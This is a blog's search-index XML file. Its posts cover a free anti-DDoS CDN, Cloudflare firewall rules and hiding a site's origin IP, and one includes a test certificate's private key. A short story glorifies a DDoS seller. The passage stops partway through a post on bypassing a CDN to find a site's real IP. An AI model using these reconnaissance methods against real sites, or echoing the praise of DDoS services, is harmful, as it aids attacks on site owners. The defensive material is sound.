<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>木木鱼免费高防CDN免费为站长扶持</title>
      <link href="/archives/11bf1697.html"/>
      <url>/archives/11bf1697.html</url>
      
        <content type="html"><![CDATA[<h1 id="木木鱼免费高防CDN介绍："><a href="#木木鱼免费高防CDN介绍：" class="headerlink" title="木木鱼免费高防CDN介绍："></a>木木鱼免费高防CDN介绍：</h1><ul><li>本站采用<a href="https://www.mmy66.cc/">木木鱼高防CDN</a>免费套餐，防御汇总超10T，死扛到底绝不回源！</li></ul><h2 id=""><a href="#" class="headerlink" title=""></a><strong><span class="p blue">【木木鱼的扶持计划】</span></strong></h2><p>木木鱼为草根站长免费提供全方位的立体防护，每月提供<span class="p green">100G免费流量</span>【<strong>攻击不计量</strong>】，全力保护您的网站不受多种攻击的影响！</p><h2 id="-1"><a href="#-1" class="headerlink" title=""></a><span class="p blue">【木木鱼高防CDN加速】</span></h2><div class="note warning flat"><p><span class="p red">国内高防CDN需要域名备案（发工单过白，或者联系QQ过白，海外不需要过白，未备案也可以使用~</span></p></div><ol><li>国内高防CDN：节点：<span class="p red">10-20</span> 个采用国内福建<span class="p blue">泉州高防</span>节点+海外美国<span class="p blue">T防</span>节点</li><li>海外高防CDN：节点：<span class="p red">10-20</span> 个采用香港优质<span class="p green">CN2</span>线路加速及美国<span class="p blue">T防</span>兜底防御</li></ol><h2 id="-2"><a href="#-2" class="headerlink" title=""></a><strong><span class="p blue">【CDN防御的多种模式】</span></strong></h2><p>木木鱼高防CDN有多种防护模式，您可以灵活调整防护规则，以达到最佳效果.针对攻击特征自动生成多种组合 CC防御策略，防御 DDoS、CC攻击！</p><h1 id="木木鱼高防CDN接入教程"><a href="#木木鱼高防CDN接入教程" class="headerlink" title="木木鱼高防CDN接入教程"></a>木木鱼高防CDN接入教程</h1><h2 id="步骤一：注册并实名账号"><a href="#步骤一：注册并实名账号" class="headerlink" title="步骤一：注册并实名账号"></a>步骤一：<strong>注册并实名账号</strong></h2><p>先去<a href="https://www.mmy66.cc/">木木鱼官网</a>注册一个账号并领取<a href="https://www.mmy66.cc/cart?fid=1&amp;gid=8">站长免费套餐</a>.注意要<span class="p red">实名</span></p><ul><li><strong>(这里大家不用担心隐私的问题,网站实名对接支付宝蚂蚁信用，避免<span class="p red">非法违规</span>网站接入)</strong></li></ul><h2 id="步骤二：添加接入域名"><a href="#步骤二：添加接入域名" class="headerlink" title="步骤二：添加接入域名"></a>步骤二：<strong>添加接入域名</strong></h2><p>进入网站管理，下面有个新增网站.填写你的信息：<span class="p blue">域名</span>、<span class="p blue">源IP</span>、<span class="p blue">端口</span><strong>(<span class="p red">https=443，http=80</span>)</strong></p><p><img src="https://image.muerg.cn/2/2023/07/18/64b6a0cbea514.png" alt="image.png"></p><h2 id="步骤三：解析域名到CANME"><a href="#步骤三：解析域名到CANME" class="headerlink" title="步骤三：解析域名到CANME"></a>步骤三：<strong>解析域名到CANME</strong></h2><p><img src="https://image.muerg.cn/2/2023/07/18/64b6b0918b819.png" alt="image.png"></p><p>将网站<strong>域名解析</strong>到木木鱼高防CDN的<span class="p green">CANME</span>，下图是腾讯云域名解析到CANME</p><p><img src="https://image.muerg.cn/2/2023/07/18/64b6afd567d13.png" alt="image.png"></p><h2 id="步骤四：配置证书和攻击防护"><a href="#步骤四：配置证书和攻击防护" class="headerlink" title="步骤四：配置证书和攻击防护"></a>步骤四：<strong>配置证书和攻击防护</strong></h2><p><img src="https://image.muerg.cn/2/2023/07/18/64b69eac078c9.png" alt="image.png"></p><ol><li>点击CDN证书管理,新增证书将<strong>秘钥</strong>和<strong>内容</strong>分别填进去，不知道证书是什么自行百度申请</li><li>回到网站管理，点击<span class="p blue">编辑</span>按钮填写HTTP监听端口修改:80,填写HTTPS网站证书ID(先前在证书管理里面).如果网站没有设置https填写关闭<br>填写HTTPS跳转端口:443,修改回源协议:<span class="p blue">跟随协议</span>，每一步都需要点击一次修改</li></ol><ul><li>CC防护可以在安全配置里面设置，网站链接数量35 超出连接数自动开启点击验证或者其他。记得点击修改</li></ul><p>有心的朋友可以在底部添加徽标，愿各位站长越做越好~ 文章有疑问的可以带图在评论区留言<img no-lazy="" class="inline" src="https://bu.dusays.com/2023/06/14/6489b2f681d79.png" style="height:100px;"><span class="p right logo large">~本站已开启评论邮件通知~</span></p>]]></content>
      
      
      <categories>
          
          <category> 防护 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 木木鱼高防CDN防护 </tag>
            
            <tag> 免费高防CDN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大黑客~五湖四海~</title>
      <link href="/archives/a269acd2.html"/>
      <url>/archives/a269acd2.html</url>
      
        <content type="html"><![CDATA[<h1 id="五湖四海"><a href="#五湖四海" class="headerlink" title="五湖四海"></a>五湖四海</h1><p>五湖是一个DDOS大佬，虽然他的端<strong>没有什么量</strong>，但是他以自己的ddos能力而自豪。然而，他也因夸大其词而给自己招来了麻烦。有一次，当他的ddos量没有达到用户期望的水平时，迎来的是一群人开始对他进行批评和嘲笑，面对众人质疑实力和舆论的压力，五湖顽强地试图反驳，守护疯狂自己的<strong>亲人</strong> 希望证明自己的价值。然而，他的辩解并没有改变别人的看法，只让他感到更加疲惫和失望。</p><p>尽管如此，五湖并没有放弃。在他最低落的时刻，他意外获得了一位<span class="p green">大佬的API</span>，这个API能为他提供前所未有的技术支持和攻击量。五湖感到兴奋和鼓舞，他看到了重新崛起的机会。</p><p>借助这个API，自此五湖的能力突飞猛进。他开始通过各种项目展示自己的才华，取得了惊人的成就，打脸了黑他喷他的人，他不再需要夸夸其谈，他的实际能力和成果已经证明了一切。</p><p>随着时间的推移，五湖成为了一位备受尊敬的大佬。他懂得了谦逊和努力的重要性，也在自己的成功之路上获得了成长和成就感。</p><p>这个故事告诉我们，虚张声势并不能永远持续，只有付诸实际行动才能让我们获得真正的认可。无论遇到多少困难和质疑，在坚持不懈地努力下，我们都有可能追求到自己向往的成功</p><p>有疑问请在下方评论区反馈留言 请在下方评论区反馈留言~ <img no-lazy="" class="inline" src="https://bu.dusays.com/2022/05/19/6285328a83ca7.gif" style="height:40px;"><img no-lazy="" class="inline" src="https://bu.dusays.com/2022/05/19/6285328a83ca7.gif" style="height:40px;"></p><span class="p right logo large">~本站已开启评论邮件通知~</span>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 黑客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CloudFlare】防护规则分享</title>
      <link href="/archives/c3760f1a.html"/>
      <url>/archives/c3760f1a.html</url>
      
        <content type="html"><![CDATA[<h1 id="【CloudFlare】防护规则配置分享"><a href="#【CloudFlare】防护规则配置分享" class="headerlink" title="【CloudFlare】防护规则配置分享"></a>【CloudFlare】防护规则配置分享</h1><h2 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h2><ul><li><span class="p blue">CloudFlare</span>是全球领先的CDN服务提供商，但是很多人不会配置规则导致还是会被<span class="p red">黑客攻击</span> ，下面分享一些<span class="p green">规则配置</span> ：</li></ul><p><img src="https://www.helloimg.com/images/2023/05/26/oJ0DZQ.jpg"></p><div class="note warning flat"><p><span class="p red">配置规则之前请先前往【防火墙】-【设置】下，将【Privacy Pass支持】关闭，以避免一种绕过质询的可能~</span></p></div><p><img src="https://www.helloimg.com/images/2023/06/10/ospPu6.png"></p><h2 id="规则一：屏蔽海外地区"><a href="#规则一：屏蔽海外地区" class="headerlink" title="规则一：屏蔽海外地区"></a>规则一：<strong>屏蔽海外地区</strong></h2><p>屏蔽一些非<span class="p green">中国</span>的大陆的访问</p><p><img src="https://bu.dusays.com/2023/07/01/64a0104f9a0a3.png"></p><pre class="line-numbers language-表达式" data-language="表达式"><code class="language-表达式">(ip.geoip.country ne "CN")</code></pre><p>大部分的CC攻击代理基本来自于海外，<span class="p green">屏蔽海外</span>可以大幅度减少黑客的攻击</p><h2 id="规则二：IDC-ASN验证"><a href="#规则二：IDC-ASN验证" class="headerlink" title="规则二：IDC ASN验证"></a>规则二：<strong>IDC ASN验证</strong></h2><p>利用的是CF对<span class="p red">黑ASN客攻击</span> 的判断。这里提到的<span class="p red">ASN</span> 为自治网络的代码，如AS4134为中国电信。以下列表中基本是数据中心服务商的代号，因为对外提供租赁它们也是常见的网络攻击来源，而非海外真实访客常用的<span class="p red">家庭宽带ISP</span> 。</p><p><img src="https://bu.dusays.com/2023/07/01/64a0129defbd6.png"></p><pre class="line-numbers language-表达式" data-language="表达式"><code class="language-表达式">(ip.geoip.中的 asnum {174 195 209 577 792 793 794 1215 1216 1217 2497 2914 3223 3255 3269 3326 3329 3457 3462 3598 4184 4190 4637 4694 4755 4785 4788 4816 4826 4835 5056 5610 5617 6471 6584 6830 6876 6877 6939 7029 7224 7303 7489 7552 7684 8068 8069 8070 8071 8074 8075 8100 8220 8560 8881 8987 9009 9299 9312 9370 9534 9678 9952 9984 10026 10453 11351 11426 11691 12076 12271 12334 12367 12874 12876 12989 14061 14117 14140 14576 14618 15169 16276 16509 16591 16629 17043 17428 17707 17788 177 89 17790 17791 18013 18228 18403 18450 18599 18734 18978 19527 19740 20207 20473 20552 20554 20860 21704 21769 21859 21887 22773 22884 23468 23724 23885 23959 2 3969 24088 24192 24424 24429 24940 25429 25697 25820 25935 25961 26160 26496 26818 27715 28429 28431 28438 28725 29066 2928 6 29287 29802 30083 30823 31122 31235 31400 31898 32097 32098 32505 32613 34081 34248 3454934947 35070 35212 35320 35540 35593 35804 35816 35908 35916 36351 36352 36384 36385 36444 36492 36806 37963 37969 38001 3 8197 38283 38365 38538 38587 38588 38627 39284 40065 40676 40788 41009 41096 41264 41378 42652 42905 43289 43624 43989 4501 1 45012 45062 45076 45085 45090 45102 45102 45102 45103 45104 45139 45458 45566 45576 45629 45753 45899 45932 46484 46844 47232 47285 47927 48024 48024 48337 48905 49327 49588 4 9981 50297 50340 50837 51852 52000 52228 52341 53089 54463 54538 54574 54600 54854 54994 55158 55330 55720 55799 55924 5593 3 55960 55967 55990 55992 56005 56011 56109 56222 57613 58073 58199 58461 58466 58519 58543 58563 58593 58772 58773 58774 58775 58776 58844 58854 58862 58879 59019 59028 59048 5 9050 59051 59052 59053 59054 59055 59067 59077 59374 60068 60592 60631 60798 61154 61317 61348 61577 61853 62044 62240 6246 8 62785 6290463018 63023 63075 63288 63314 63545 63612 63620 63631 63655 63677 63678 63679 63727 63728 63729 63835 63838 63888 63916 6 3949 64050 131090 131106 131138 131139 131140 131141 131293 131428 131444 131477 131486 131495 132196 132203 132509 132510 132513 132591 132839 133024 133199 133380 133478 133492 133746 133752 133774 133775 133776 133905 133929 134238 134327 134760 134761 134763 134764 134769 134770 134771 134835 134963 135061 135290 135300 13 5330 135377 135629 137693 137697 137699 137753 137784 137785 137787 137788 137876 137969 138366 138407 138607 138915 138949 138950 138952 138982 138994 139007 139018 139124 139144 139201 139203 139220 139316 139327 139726 139887 140096 140596 140701 140716 140717 140720 140723 140979 141157 141180 142570 149167 177453 177549 197099 197540 198047 19 8651 199490 199506 199524 199883 200756 201094 201978 202053202675 203087 204601 204720 206092 206204 206791 206798 207319 207400 207590 208425 208556 211914 212708 213251 213375 26 2187 263022 263196 263639 263693 264344 264509 265443 265537 266706 267784 269939 270110 328608 394699 395003 395936 395954 395973 398101})</code></pre><p>如上，配置为<span class="p red">ASN</span> 的包含以下各项，选择操作一般为验证码<strong>【托管质询】</strong> 或者 <strong>【JS质询】</strong>，在遭受严重攻击选择<span class="p red">【阻止】</span></p><p>ASN的话参考这个ASN链接 <a href="https://2ip.io/analytics/asn-list/?orgName=alibaba">ASN list</a> </p><ul><li>如果需要ITDOG测速观察的话，请单独加一个规则将节点IP加入白名单<pre class="line-numbers language-白名单" data-language="白名单"><code class="language-白名单">(ip.src in {47.92.31.57 109.248.18.86 154.22.127.137 23.225.146.6 220.181.53.87 43.156.69.84 43.155.105.226 106.225.239.7 183.201.192.68 183.201.192.68 45.65.44.14 102.140.92.41 23.225.146.6 154.22.127.137 143.92.41.132 102.140.92.41 102.140.92.41 203.57.58.1 101.193.215.70 43.130.151.11 27.185.235.70 113.240.100.81 115.239.224.6 125.73.215.4 218.30.71.80 1.193.215.70 220.181.53.87 125.73.215.4 27.185.235.70 203.57.58.110 115.239.224.6 47.92.77.114 43.156.69.84 45.65.44.14 23.225.146.6 119.96.16.87 45.251.101.5 117.187.182.132 119.96.16.87 47.92.79.71 45.251.101.5 103.78.242.179 117.187.182.132 45.251.101.5 202.133.243.83 8.142.104.65 1.1.1.1 2.2.2.2 3.3.3.3 4.4.4.4})</code></pre></li></ul><h2 id="规则三：根据IP信誉阻止请求"><a href="#规则三：根据IP信誉阻止请求" class="headerlink" title="规则三：根据IP信誉阻止请求"></a>规则三：<strong>根据IP信誉阻止请求</strong></h2><p>威胁分数大于等于5 进行阻止。威胁分数正常访客不会触发。也可以加入cf.client.bot</p><span class="p green">cf.client.bot（合法机器人爬虫）当数值为true，标识来自良好的机器人或爬虫的请求</span><p><img src="https://bu.dusays.com/2023/07/01/64a014380cf25.png"></p><p>　cf.threat_score（威胁分数）表示从0到100的Cloudflare威胁评分，其中0表示低风险。大于10的值可能代表垃圾邮件发送者或机器人，大于40的值表示互联网上的不良行为者。一个常见的建议是质询分数高于10的请求并阻止分数高于50的请求。</p><pre class="line-numbers language-表达式" data-language="表达式"><code class="language-表达式">(not cf.client.bot and cf.threat_score gt 2)</code></pre><ul><li>关于威胁分数：字段参考 · <a href="https://www.cloudflare.com/">Cloudflare 规则集引擎文档</a></li></ul><h2 id="规则四：请求速率限制"><a href="#规则四：请求速率限制" class="headerlink" title="规则四：请求速率限制"></a>规则四：<strong>请求速率限制</strong></h2><p>从2022年9月开始，<span class="p green">CloudFlare</span>开始向免费用户（包括<strong>Plesk Plus</strong>）提供一条免费的速率限制规则：<a href="https://blog.cloudflare.com/unmetered-ratelimiting/">CloudFlare官方博客</a> ，该功能是防御CC强有效的功能，可以从<strong>【安全性】</strong> - <strong>【WAF-】</strong> <strong>【速率限制规则】</strong>进入配置页面。<br><img src="https://bu.dusays.com/2023/07/01/64a018e4e93a8.png"></p><pre class="line-numbers language-表达式" data-language="表达式"><code class="language-表达式">(http.request.uri.path eq "/")</code></pre><ul><li>针对免费用户来说可以配置的参数比较少，主要实现的是同个IP【10秒内请求数&gt;n】时对其返回429阻止访问。如图填写/可对zone下所有域名进行保护，个人博客正常情况下n建议设置为35，资源更多的站点可以考虑适当放大（以不影响正常访问为准）</li></ul><h2 id="规则五：选择性防盗链"><a href="#规则五：选择性防盗链" class="headerlink" title="规则五：选择性防盗链"></a>规则五：<strong>选择性防盗链</strong></h2><p>　引用方（http.referer）表示HTTP Referer请求头，其中包含链接到当前请求页面的网页地址。上述表达式的意思是，排除指定网站之外，其他网站的盗链均阻止。</p><p><img src="https://bu.dusays.com/2023/07/01/64a01baaaaa55.png"></p><pre class="line-numbers language-表达式" data-language="表达式"><code class="language-表达式">(not http.referer contains "http://williamlong.info")</code></pre><ul><li>如果使用这个规则，需要在Scrape Shield应用程序中禁用热链接保护。</li></ul><h1 id="结语："><a href="#结语：" class="headerlink" title="结语："></a>结语：</h1><p>这篇博客对于CF WAF的配置分享到此告一段落了，但是对这些规则的应用仍有正则表达式等更高级的应用方式去探索</p><p>感谢前人的总结和分享，也期待继往开来的你们~</p><p>有疑问请带截图在下方评论区反馈留言 请带截图在下方评论区反馈留言~ <img no-lazy="" class="inline" src="https://bu.dusays.com/2022/05/19/6285328a83ca7.gif" style="height:40px;"><img no-lazy="" class="inline" src="https://bu.dusays.com/2022/05/19/6285328a83ca7.gif" style="height:40px;"></p><span class="p right logo large">~本站已开启评论邮件通知~</span>]]></content>
      
      
      <categories>
          
          <category> 防护 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cloudflare防护 </tag>
            
            <tag> Cloudflare策略 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何防止CDN网站被溯源</title>
      <link href="/archives/755cff22.html"/>
      <url>/archives/755cff22.html</url>
      
        <content type="html"><![CDATA[<h1 id="如何反溯源隐藏自己的源IP防止溯源？"><a href="#如何反溯源隐藏自己的源IP防止溯源？" class="headerlink" title="如何反溯源隐藏自己的源IP防止溯源？"></a>如何反溯源隐藏自己的源IP防止溯源？</h1><p>还有些大牛会进行渗透攻击、CC攻击，溯源打服务器，各式各样的，防不胜防。所以很多站长套起了cdn，比起cdn提供的加速效果，更多的站长可能还是为了保护那可怜弱小的源站ip不被发现然后攻击。</p><ul><li>那么，他们怎么知道你的<span class="p green">真实IP</span>？请看CDN溯源篇：<a href="http://mmy66.cc/archives/1a12a789.html">木木鱼-绕过CDN查找背后IP的方法手段</a><br>下面木木鱼给大家带来一篇简单的<strong>防溯源教程</strong></li></ul><p><img src="https://bu.dusays.com/2023/06/14/6489b5ce09021.webp" alt="image.png"></p><h2 id="第一步：先给自己换一个新的IP"><a href="#第一步：先给自己换一个新的IP" class="headerlink" title="第一步：先给自己换一个新的IP"></a>第一步：<strong>先给自己换一个新的IP</strong></h2><p>更换已经被泄露过的源IP，如果没有泄露的话就不用更换</p><h2 id="第二步：给自己套一个CDN"><a href="#第二步：给自己套一个CDN" class="headerlink" title="第二步：给自己套一个CDN"></a>第二步：<strong>给自己套一个CDN</strong></h2><p>之前文章有写过如何套用<strong>Cloudfare</strong>，具体点击下方查看步骤</p><div calss="anzhiyu-tag-link"><a class="tag-Link" target="_blank" href="https://www.cloudflare-cn.com/">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="background-image: url(https://cf-assets.www.cloudflare.com/slt3lc6tev37/4daPBhS9LzK0FuXxtoVnnr/c637840d1f5405f99489ea829ff240eb/BDES-1217_Data_Localization_Page_Hero.svg);"></div>        <div class="tag-link-right">            <div class="tag-link-title">Cloudflare免费防护配置教程</div>            <div class="tag-link-sitename"> 为云而建的全球性网络 Cloudflare 是一个全球网络，旨在让您连接到互联网的一切都安全、私密、快速和可靠，保护您的网站、API 和互联网应用程序。保护企业网络、员工和设备。编写和部署在网络边缘运行的代码。</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div><h2 id="第三步：禁止直接通过IP访问，容易被扫到"><a href="#第三步：禁止直接通过IP访问，容易被扫到" class="headerlink" title="第三步：禁止直接通过IP访问，容易被扫到"></a>第三步：<strong>禁止直接通过IP访问，容易被扫到</strong></h2><ul><li>给IP配置上一张带错误域名的证书，防止泄露你自己的域名</li><li>禁止直接访问IP，将访问IP的请求，不管是HTTP还是HTTPS全部转错误页 返回状态码444 ERR_EMPTY_RESPONSE</li></ul><ol><li><strong>创建一个默认站点</strong><br>在宝塔中创建一个默认站点域名随便填<br> <img src="https://bu.dusays.com/2023/06/26/64987859b13e5.png" alt="image.png"></li><li><strong>修改默认站点到新创建的这个域名</strong><br><img src="https://bu.dusays.com/2023/06/26/6498787f5d6af.png" alt="image.png"></li><li><strong>给这个网页加上一张空证书,用的是<a href="https://myssl.com/create_test_cert.html">亚洲诚信测试证书生成</a>,域名的话随便填</strong></li></ol><p>点击刚刚添加的网站，网站名 ，添加一张空白的证书，我已经生成好了直接复制就可以使用</p><p><img src="https://bu.dusays.com/2023/06/26/6498787f5d6af.png" alt="image.png"></p><p> key（秘钥）：</p> <pre class="line-numbers language-none"><code class="language-none">-----BEGIN RSA PRIVATE KEY-----MIIEogIBAAKCAQEA3eOYHHb536pNXndHkqnc0p3BmK3J0WM1n7QzEsWnqwC1uyqK2vQm5SwT72MN1IxKsLBHwqEu3tQC956GN4F0FGvMWQjB8J9dX7+Uw5CPryMAFQ8hyZZe84K+QA5PQvf29IuGRMIeyXBAaHr4Pe3NRQkIrSCYhMoZk4/j6tCnwX1U09z2eFDTQqmQcJfdreismI3RbnBpb1V0NlYgD/JzT6K2pFgtJQ38Scmuv3386HOotQA3jGQ3fUY3NqaJGCAbqVizIUT+5cltpPyE/Cc9KEeaVu2ZZ6fVr/sDJg8w2c9Zzer9hwzeSIErcJA6NxTT5uSlz3gz3+RcCC11sFXELwIDAQABAoIBAARUj8BmdgPub+obC9OJ6xxVJdUT9y9V71L5klGYd+g3cFSBxQn239dzH8R5O2jdgAuotQ3QVXjVzGUGu/nTVe+cFvXZ3OcURR88Puv+Iz+4wCSpEfC8NYgtEgdwAA3/httI6crnuvAVd7xSQgv7WxkwzvGKBE/7HbqqgTkw70UwYqly52109QGlHi6TDajlEppQvzlWrBW/9p+CwQhwgaxDkedZ+eMvoZt6c4fPtmNg3KGBRF1nk5lqNqvEFkkCSY+kAuLpZUQUpQ6+tlW2kZgZnUeyaZWBbDFnYVtul6ZAfh6Hl4wMMfETuPxSeQwAgQer1uoHFT23SK3HraEYCMkCgYEA4cmLZu6YrZSnUJw4WXDakbdvNy6iLX62hCPpemh1WA2cZt13wCoT9rZlKA7wmxd7qQqNF4Zil1DwC2rY6F90t4AV3bWWgw8xqdmyo0I8M02Nj+pVm1nSV39oqQRtlLEf1fK/vGzwKMh8i3lnZMlw+P/Fq1t3FHuZR+cV7KHR7wsCgYEA+5SDbKN2ZzXj3DaaUM8FzIphv0LUJ3CC11ubLLiYGudOIltqr5mYyYHEZjY1RfnzZKvfCRI6ROdR81sp48EpYCwmGxcovmUfPjY32gj/yxJUFcVTFRajtt5kkGlMIH5S9/E+dDbJPvP5zcrVS2zt6BP7bviCK3D/imitK6EYxe0CgYBDEUX6RkdN0Ek+1ZibYL1b6Vv8zTpZPzlh2PUCakLo6+oYWBK5HwadEyLLGlz4BKqz1LGCWmWwwtb63TsfEzOtSju0hrr1pS7AYC0C96rAJno1VIsnQTAM04i4I9uU/mQRfjDb/JP92Ue9ektvEbMgE4GY2+tsRyaJyCeoCY09bwKBgGWkdQy5ZicA4NShwusPGTqwVhmd+HUOwe4cdq80zU9hUHIVGR9lIROYuC7Li+5/s9RilDPoB167TqLRnDUGX58ZdzPOwYla9ap+4UXYCPCUsSAynwSQJwjFBUBLKpSeNQszjpYJZHlovO5mGpLkqaHwIM+O25iNiND0xbIw3f9pAoGARhPUvUZR9DhE5YOiQ4rfnyoYjLi9/nX4ASNwVrHJCNDKleZCGv0fYDw1s/ew+jVDwND/OH8ElBKNWIJUdpgYoxUddCTT/wSEko2Hphlb88qOvcWkAnx16o/syTzAMCwEUdiY6Q+U8DfBp818AOqgdb7Gu/RGB6sf8DGlEiKCC/4=-----END RSA PRIVATE KEY-----</code></pre><p>证书：</p><pre class="line-numbers language-none"><code class="language-none">-----BEGIN CERTIFICATE-----MIIEDzCCAvegAwIBAgIQY9W9aeckSgWdJxa1/Tch7DANBgkqhkiG9w0BAQsFADBeMQswCQYDVQQGEwJDTjEOMAwGA1UEChMFTXlTU0wxKzApBgNVBAsTIk15U1NMIFRlc3QgUlNBIC0gRm9yIHRlc3QgdXNlIG9ubHkxEjAQBgNVBAMTCU15U1NMLmNvbTAeFw0yMjA3MDYwMzQ1MTNaFw0yNzA3MDUwMzQ1MTNaMDMxCzAJBgNVBAYTAkNOMSQwIgYDVQQDDBvojYnms6XpqazmiavkvaDniLnlubLlmJsuY24wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDd45gcdvnfqk1ed0eSqdzSncGYrcnRYzWftDMSxaerALW7Kora9CblLBPvYw3UjEqwsEfCoS7e1AL3noY3gXQUa8xZCMHwn11fv5TDkI+vIwAVDyHJll7zgr5ADk9C9/b0i4ZEwh7JcEBoevg97c1FCQitIJiEyhmTj+Pq0KfBfVTT3PZ4UNNCqZBwl92t6KyYjdFucGlvVXQ2ViAP8nNPorakWC0lDfxJya6/ffzoc6i1ADeMZDd9Rjc2pokYIBupWLMhRP7lyW2k/IT8Jz0oR5pW7Zlnp9Wv+wMmDzDZz1nN6v2HDN5IgStwkDo3FNPm5KXPeDPf5FwILXWwVcQvAgMBAAGjgfMwgfAwDgYDVR0PAQH/BAQDAgWgMB0GA1UdJQQWMBQGCCsGAQUFBwMBBggrBgEFBQcDAjAfBgNVHSMEGDAWgBQogSYF0TQaP8FzD7uTzxUcPwO/fzBjBggrBgEFBQcBAQRXMFUwIQYIKwYBBQUHMAGGFWh0dHA6Ly9vY3NwLm15c3NsLmNvbTAwBggrBgEFBQcwAoYkaHR0cDovL2NhLm15c3NsLmNvbS9teXNzbHRlc3Ryc2EuY3J0MDkGA1UdEQQyMDCCG+iNieazpemprOaJq+S9oOeIueW5suWYmy5jboERMTEwNTYwMjc1MkBxcS5jb20wDQYJKoZIhvcNAQELBQADggEBAJSM9hShBE3O1Bq3hmKLiiJgBszz9cOWYTTF7YgmTzM1wU9rOwTz6cdD5OUsL7OUJ6bD+Wfr6sbhePMEQbYiPzKdtVhfZvSmTflhZz+NPpZycGU7685zv4fqOFC8yLwsmL430JaX719efPH7OCuzm7iQCPpA9DLn2LyQ1zgUTNMDf1CsoP9xEAMMbp1QmXIDlmOSV8D74n0iJRBgeWWoJd6qXK+QL2wjYlsB04IkEWkqjBApLXhwjpl2P8VqOfdFZMjVZHvjfyVoXw/P1uifjXKyObV1nyia5rmy+jGqeN56Sg9F32/eaqzUQEVbAIIJGQ7P1Ch9m5olSYxTBF+6yOs=-----END CERTIFICATE-----</code></pre><p>然后我们保存。这个时候，我们再去查看证书的时候，已经变了<br><img src="https://bu.dusays.com/2023/06/26/6498767fd4a28.png" alt="image.png"></p><ol start="4"><li>保存后，<strong>点击配置文件修改配置</strong><pre class="line-numbers language-none"><code class="language-none">listen 80 default_server;listen 443 ssl http2 default_server; server_name default.com;return 444;</code></pre></li></ol><p><img src="https://bu.dusays.com/2023/06/26/649879ad856d9.png" alt="image.png"></p><h2 id="第四步：关闭邮件"><a href="#第四步：关闭邮件" class="headerlink" title="第四步：关闭邮件"></a>第四步：<strong>关闭邮件</strong></h2><p>一般邮件服务器在内部，没有CDN解析，邮件返回的域名IP可能是真实IP</p><span class="p green">关闭邮件功能</span>或者<span class="p green">调用第三方邮件api</span>防止泄露源<h2 id="第五步：参考木木鱼-绕过CDN查找背后IP的方法手段检查自己的泄露源的漏洞"><a href="#第五步：参考木木鱼-绕过CDN查找背后IP的方法手段检查自己的泄露源的漏洞" class="headerlink" title="第五步：参考木木鱼-绕过CDN查找背后IP的方法手段检查自己的泄露源的漏洞"></a>第五步：<strong>参考<a href="http://mmy66.cc/archives/1a12a789.html">木木鱼-绕过CDN查找背后IP的方法手段</a>检查自己的泄露源的漏洞</strong></h2><h1 id="基本上做到以上两点“”、“”，基本上可以做到不泄露源地址了"><a href="#基本上做到以上两点“”、“”，基本上可以做到不泄露源地址了" class="headerlink" title="基本上做到以上两点“”、“”，基本上可以做到不泄露源地址了"></a>基本上做到以上两点“<span class="p green">空白证书</span>”、“<span class="p green">关闭邮件功能</span>”，基本上可以做到不泄露源地址了</h1><p>关注本站，后续将带来更高级的cloudflare防护策略，文章有疑问的可以在评论区留言<img no-lazy="" class="inline" src="https://bu.dusays.com/2023/06/14/6489b2f681d79.png" style="height:100px;"><span class="p right logo large">~本站已开启评论邮件通知~</span></p>]]></content>
      
      
      <categories>
          
          <category> 防护 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CDN溯源技术 </tag>
            
            <tag> CDN防护 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>木木鱼-绕过CDN查找背后IP的方法手段</title>
      <link href="/archives/1a12a789.html"/>
      <url>/archives/1a12a789.html</url>
      
        <content type="html"><![CDATA[<h1 id="绕过CDN查询背后真实IP方法："><a href="#绕过CDN查询背后真实IP方法：" class="headerlink" title="绕过CDN查询背后真实IP方法："></a>绕过CDN查询背后真实IP方法：</h1><h2 id="方法一：DNS历史解析记录"><a href="#方法一：DNS历史解析记录" class="headerlink" title="方法一：DNS历史解析记录"></a>方法一：<strong>DNS历史解析记录</strong></h2><p>查询域名的<strong>历史解析记录</strong>，可能会找到网站使用CDN前的解析记录，从而获取<span class="p green">真实IP</span></p><p>相关查询的网站有：<a href="https://viewdns.info/iphistory/">iphistory</a>、<a href="https://www.dnsdb.io/zh-cn/search?q=mmy66.cc">DNS查询</a>、<a href="https://x.threatbook.com/v5/domain/mmy66.cc?source=top">微步在线</a>、<a href="https://site.ip138.com/mmy66.cc/">域名查询</a>、<a href="https://securitytrails.com/domain/mmy66.cc/dns/">DNS历史查询</a>、<a href="https://sitereport.netcraft.com/?url=mmy66.cc">Netcraft</a></p><h2 id="方法二：查找子域名分站"><a href="#方法二：查找子域名分站" class="headerlink" title="方法二：查找子域名分站"></a>方法二：<strong>查找子域名分站</strong></h2><p>很多时候，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找<strong>子域名</strong>来查找网站的<span class="p green">真实IP</span></p><ol><li>搜索引擎查询：如<a href="https://www.google.com.hk/search?q=site:mmy66.cc+-www&amp;oq=site:mmy66.cc+-www&amp;aqs=chrome..69i57j69i58.263j0j7&amp;sourceid=chrome&amp;ie=UTF-8">Google</a>、<a href="https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=baidu&amp;wd=site:mmy66.cc%20-www&amp;fenlei=256&amp;rsv_pq=0xa2366ab50004c8ac&amp;rsv_t=f9a6VIUC/B+8oc7Y+cCefqUbiW8Hk5eRpZxbGx854FaUD4vd23ZKTaPWWtBk&amp;rqlang=en&amp;rsv_dl=tb&amp;rsv_sug3=2&amp;rsv_n=2&amp;rsv_sug2=0&amp;rsv_btype=i&amp;inputT=315&amp;rsv_sug4=401">baidu</a>、<a 